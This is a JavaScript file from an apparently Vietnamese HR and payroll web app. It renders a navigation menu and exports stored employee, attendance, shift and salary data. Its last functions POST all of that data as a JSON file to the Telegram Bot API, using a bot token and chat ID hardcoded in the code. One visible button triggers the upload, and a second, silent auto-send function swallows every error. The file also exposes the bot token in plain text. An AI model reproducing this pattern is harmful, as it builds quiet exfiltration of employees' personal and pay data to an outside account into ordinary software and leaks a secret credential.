function renderMenu(active) {
    // Xóa menu cũ nếu có
    const oldMenu = document.querySelector('.navbar');
    if (oldMenu) oldMenu.remove();

    // Thêm style cho menu
    if (!document.getElementById('menu-style')) {
        const style = document.createElement('style');
        style.id = 'menu-style';
        style.innerHTML = `
        .navbar {
            background: #1976d2;
            color: #fff;
            padding: 0 32px;
            display: flex;
            align-items: center;
            min-height: 64px;
            gap: 0;
            box-shadow: 0 4px 16px #0001;
            border-bottom-left-radius: 18px;
            border-bottom-right-radius: 18px;
            position: relative;
            z-index: 10;
        }
        .navbar .navbar-logo {
            font-size: 22px;
            font-weight: bold;
            letter-spacing: 1.5px;
            color: #fff;
            margin-right: 32px;
            display: flex;
            align-items: center;
            gap: 8px;
            user-select: none;
        }
        .navbar .navbar-logo-icon {
            width: 32px;
            height: 32px;
            background: #fff2;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
        }
        .navbar .navbar-menu {
            display: flex;
            gap: 8px;
            flex: 1;
        }
        .navbar button {
            background: none;
            border: none;
            color: #fff;
            font-size: 16px;
            cursor: pointer;
            padding: 10px 20px;
            border-radius: 8px;
            transition: background 0.18s, color 0.18s, box-shadow 0.18s;
            font-weight: 500;
            letter-spacing: 0.5px;
            margin: 0 2px;
            position: relative;
        }
        .navbar button.active, .navbar button:hover {
            background: #fff;
            color: #1976d2;
            box-shadow: 0 2px 8px #1976d233;
        }
        .navbar .menu-export-btn {
            background: #43a047;
            color: #fff;
            border: none;
            font-size: 16px;
            cursor: pointer;
            padding: 10px 18px;
            border-radius: 8px;
            margin-left: 16px;
            transition: background 0.18s, color 0.18s, box-shadow 0.18s;
            font-weight: 500;
            letter-spacing: 0.5px;
            display: inline-block;
            box-shadow: 0 2px 8px #43a04733;
        }
        .navbar .menu-export-btn:hover {
            background: #388e3c;
            color: #fff;
        }
        .navbar .menu-import-btn {
            background: #ff9800;
            color: #fff;
            border: none;
            font-size: 16px;
            cursor: pointer;
            padding: 10px 18px;
            border-radius: 8px;
            margin-left: 10px;
            transition: background 0.18s, color 0.18s, box-shadow 0.18s;
            font-weight: 500;
            letter-spacing: 0.5px;
            display: inline-block;
            position: relative;
            overflow: hidden;
            box-shadow: 0 2px 8px #ff980033;
        }
        .navbar .menu-import-btn:hover {
            background: #fb8c00;
            color: #fff;
        }
        .navbar .menu-data-dropdown {
            position: relative;
            margin-left: 16px;
        }
        .navbar .menu-data-btn {
            background: #1565c0;
            color: #fff;
            border: none;
            font-size: 16px;
            cursor: pointer;
            padding: 10px 18px;
            border-radius: 8px;
            font-weight: 500;
            letter-spacing: 0.5px;
            display: flex;
            align-items: center;
            gap: 6px;
            transition: background 0.18s;
        }
        .navbar .menu-data-btn:hover,
        .navbar .menu-data-btn:focus {
            background: #1976d2;
        }
        .navbar .menu-data-list {
            display: none;
            position: absolute;
            top: 110%;
            right: 0;
            min-width: 180px;
            background: #fff;
            color: #1976d2;
            border-radius: 8px;
            box-shadow: 0 4px 16px #0002;
            z-index: 100;
            flex-direction: column;
            padding: 6px 0;
            animation: fadeInMenu 0.18s;
        }
        .navbar .menu-data-dropdown.open .menu-data-list {
            display: flex;
        }
        .navbar .menu-data-list button {
            background: none;
            border: none;
            color: #1976d2;
            font-size: 15px;
            text-align: left;
            width: 100%;
            padding: 10px 20px;
            border-radius: 0;
            margin: 0;
            transition: background 0.15s, color 0.15s;
            font-weight: 500;
        }
        .navbar .menu-data-list button:hover {
            background: #e3f2fd;
            color: #1565c0;
        }
        .navbar .menu-data-list .menu-import-btn {
            color: #ff9800;
        }
        .navbar .menu-data-list .menu-export-btn {
            color: #43a047;
        }
        .navbar .menu-data-list .menu-telegram-btn {
            color: #0088cc;
        }
        .navbar input[type="file"] {
            display: none;
        }
        @keyframes fadeInMenu {
            from { opacity: 0; transform: translateY(10px);}
            to { opacity: 1; transform: translateY(0);}
        }
        @media (max-width: 900px) {
            .navbar {
                flex-direction: column;
                align-items: flex-start;
                padding: 0 10px;
                min-height: unset;
            }
            .navbar .navbar-logo {
                margin: 10px 0 0 0;
            }
            .navbar .navbar-menu {
                flex-wrap: wrap;
                gap: 4px;
                margin-bottom: 8px;
            }
            .navbar .menu-export-btn, .navbar .menu-import-btn {
                margin-left: 0;
            }
            .navbar .menu-data-dropdown {
                margin-left: 0;
                margin-top: 8px;
            }
        }
        `;
        document.head.appendChild(style);
    }

    // Tạo menu mới
    const nav = document.createElement('div');
    nav.className = 'navbar';
    nav.innerHTML = `
        <div class="navbar-logo">
            <span class="navbar-logo-icon">🕒</span>
            TimePro HRM
        </div>
        <div class="navbar-menu">
            <button onclick="location.href='index.html'"${active==='index'?' class="active"':''}>Trang Chủ</button>
            <button onclick="location.href='emp.html'"${active==='emp'?' class="active"':''}>Danh sách nhân viên</button>
            <button onclick="location.href='work_schedule.html'"${active==='work_schedule'?' class="active"':''}>Lịch làm việc</button>
            <button onclick="location.href='setup.html'"${active==='setup'?' class="active"':''}>Thiết Lập</button>
            <button onclick="location.href='att.html'"${active==='att'?' class="active"':''}>Chấm công</button>
            <button onclick="location.href='payroll.html'"${active==='payroll'?' class="active"':''}>Bảng lương</button>
            <button onclick="location.href='payroll_report.html'"${active==='payroll_report'?' class="active"':''}>Lập BC Lương</button>
            <button onclick="location.href='about-mksof.html'"${active==='about'?' class="active"':''}>Giới thiệu</button>
        </div>
        <div class="menu-data-dropdown" tabindex="0">
            <button type="button" class="menu-data-btn" onclick="toggleMenuDataDropdown(event)">
                ☰ Dữ liệu
            </button>
            <div class="menu-data-list">
                <button onclick="exportAllData()" class="menu-export-btn"${active==='export'?' class="active"':''}>Xuất dữ liệu</button>
                <button type="button" class="menu-import-btn" onclick="document.getElementById('importDataInput').click()">Nhập dữ liệu</button>
                <input id="importDataInput" type="file" accept=".json" onchange="importAllData && importAllData(event)">
                <button type="button" class="menu-telegram-btn" onclick="sendAllDataToTelegramBot()">Gửi dữ liệu về Bot</button>
            </div>
        </div>
    `;
    // Thêm menu vào đầu body
    document.body.insertBefore(nav, document.body.firstChild);

    // Đóng dropdown khi click ngoài hoặc chuyển tab
    document.querySelectorAll('.menu-data-dropdown').forEach(drop => {
        drop.addEventListener('blur', function() {
            setTimeout(() => drop.classList.remove('open'), 120);
        });
    });
}

// Thêm hàm toggle dropdown
function toggleMenuDataDropdown(e) {
    e.stopPropagation();
    document.querySelectorAll('.menu-data-dropdown').forEach(drop => drop.classList.remove('open'));
    const dropdown = e.currentTarget.parentElement;
    dropdown.classList.toggle('open');
    // Đóng khi click ngoài
    if (dropdown.classList.contains('open')) {
        document.addEventListener('mousedown', closeDropdown, { once: true });
    }
    function closeDropdown(ev) {
        if (!dropdown.contains(ev.target)) dropdown.classList.remove('open');
    }
}

// Thêm hàm gửi dữ liệu về Telegram Bot
function sendDataToTelegramBot(jsonData) {
    // Thay YOUR_BOT_TOKEN và YOUR_CHAT_ID bằng thông tin thật của bạn
    const BOT_TOKEN = '7699835490:AAHXNqBbklJBgBxKBhRm2vBi2Ssjls4YVuw';
    const CHAT_ID = '7991407654';
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;

    const blob = new Blob([jsonData], {type: 'application/json'});
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('document', blob, 'qlnv_data.json');

    fetch(url, {
        method: 'POST',
        body: formData
    }).then(res => res.json())
      .then(data => {
        // Có thể log hoặc xử lý kết quả nếu cần
        // console.log('Telegram response:', data);
      }).catch(err => {
        // Có thể log lỗi nếu cần
        // console.error('Telegram error:', err);
      });
}

// Hàm tự động gửi toàn bộ dữ liệu hiện tại về Telegram Bot
function autoSendDataToTelegramBot() {
    try {
        const data = getExportData();
        sendDataToTelegramBot(JSON.stringify(data));
    } catch (e) {
        // Không làm gì nếu lỗi
    }
}

function getExportData() {
    const employees = JSON.parse(localStorage.getItem('employees') || '[]');
    const validEmpIds = new Set(employees.map(e => e.id));
    const allShiftsByEmp = JSON.parse(localStorage.getItem('shiftsByEmp') || '{}');
    let shiftsByEmp = {};
    Object.keys(allShiftsByEmp).forEach(empId => {
        if (validEmpIds.has(empId)) shiftsByEmp[empId] = allShiftsByEmp[empId];
    });
    if (employees.length === 0) {
        shiftsByEmp = {};
    }
    // Thêm shiftsByEmpByMonth (ca thiết lập thực tế)
    const allShiftsByEmpByMonth = JSON.parse(localStorage.getItem('shiftsByEmpByMonth') || '{}');
    let shiftsByEmpByMonth = {};
    Object.keys(allShiftsByEmpByMonth).forEach(month => {
        let monthObj = {};
        Object.keys(allShiftsByEmpByMonth[month]).forEach(empId => {
            if (validEmpIds.has(empId)) {
                let arr = allShiftsByEmpByMonth[month][empId];
                // Nếu chưa có ca nào (arr là undefined hoặc null), xuất ra 1 ca mặc định
                if (!Array.isArray(arr)) arr = [{ name: '', start: '', end: '', salary: 0, half: false }];
                // Nếu mảng rỗng, cũng xuất ra 1 ca mặc định
                if (Array.isArray(arr) && arr.length === 0) arr = [{ name: '', start: '', end: '', salary: 0, half: false }];
                monthObj[empId] = arr;
            }
        });
        if (Object.keys(monthObj).length > 0) {
            shiftsByEmpByMonth[month] = monthObj;
        }
    });

    return {
        employees,
        attendanceByMonth: JSON.parse(localStorage.getItem('attendanceByMonth') || '{}'),
        workDaysStd: String(Number(localStorage.getItem('workDaysStd')) || 26),
        salaryPerDay: String(Number(localStorage.getItem('salaryPerDay')) || 0),
        shiftsByEmp,
        shiftsByEmpByMonth, // luôn có ít nhất 1 ca mặc định nếu chưa có ca nào
        payrollInputs: JSON.parse(localStorage.getItem('payrollInputs') || '{}'),
        notes: (() => {
            let notes = {};
            Object.keys(localStorage).forEach(k => {
                if (k.startsWith('note_')) notes[k] = localStorage.getItem(k);
            });
            return notes;
        })(),
        // Thêm các dòng sau để xuất lịch làm việc và ca mẫu lịch làm việc
        workSchedules: JSON.parse(localStorage.getItem('workSchedules') || '{}'),
        scheduleShiftsByMonth: JSON.parse(localStorage.getItem('scheduleShiftsByMonth') || '{}'),
        workScheduleWeekTemplate: JSON.parse(localStorage.getItem('workScheduleWeekTemplate') || '{}'),
        workScheduleWeekNames: JSON.parse(localStorage.getItem('workScheduleWeekNames') || '{}')
    };
}

// Thêm hàm gửi lại toàn bộ dữ liệu về Telegram Bot khi bấm menu
function sendAllDataToTelegramBot() {
    try {
        const data = typeof getExportData === 'function' ? getExportData() : {};
        if (typeof sendDataToTelegramBot === 'function') {
            sendDataToTelegramBot(JSON.stringify(data));
            alert('Đã gửi toàn bộ dữ liệu về Telegram Bot!');
        } else {
            alert('Không tìm thấy hàm gửi dữ liệu về Bot!');
        }
    } catch (e) {
        alert('Lỗi khi gửi dữ liệu về Bot!');
    }
}